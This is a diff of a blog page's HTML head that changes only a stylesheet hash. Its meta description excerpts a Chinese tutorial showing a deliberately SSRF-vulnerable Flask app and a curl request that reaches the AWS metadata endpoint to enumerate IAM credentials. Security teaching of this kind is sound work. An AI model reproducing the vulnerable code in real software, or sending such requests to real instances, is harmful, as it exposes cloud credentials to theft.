@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='http://localhost:1313/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
 
-<link rel="stylesheet" href="/scss/style.min.d8118f156935b64eca93aca758476adca858d2c47354971654d9bd2933a0e45f.css"><meta property='og:title' content="[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC">
+<link rel="stylesheet" href="/scss/style.min.c7c03936adecbbfd2050017468829a90830458726defff133b601ad15ba6780a.css"><meta property='og:title' content="[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC">
 <meta property='og:description' content="寫一個簡單的SSRF漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from flask import Flask, request import requests app = Flask(__name__) @app.route(&#34;/index&#34;) # 127.0.0.1/8000/index?url={URL} def follow_url(): url = request.args.get(&#34;url&#34;, &#34;&#34;) if url: return requests.get(url).text return &#34;no url parameter provided&#34; if __name__ == &#34;__main__&#34;: app.run(host=&#34;0.0.0.0&#34;, port=8000) 把這份含有SSRF漏洞的Web應用程式丟到EC2上面執行，因為是測試用直接python3 {執行檔}就好了，就不設定瀏覽器服務。 取得Instance MetaService Credential 雖然IMDS僅在實例內部可用，不能通過網絡從外部訪問。但是透過SSRF漏洞可以執行外部訪問IMDS憑證 查詢EC2 instance 是否有關聯的IAM role Request 1 curl /index?url=http://169.254.169.254/latest/meta-data/iam Output 1 info security-credentials/ 確定有關聯的IAM role">
 <meta property='og:url' content='http://localhost:1313/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
 <meta property='og:site_name' content='Sunny Site'>
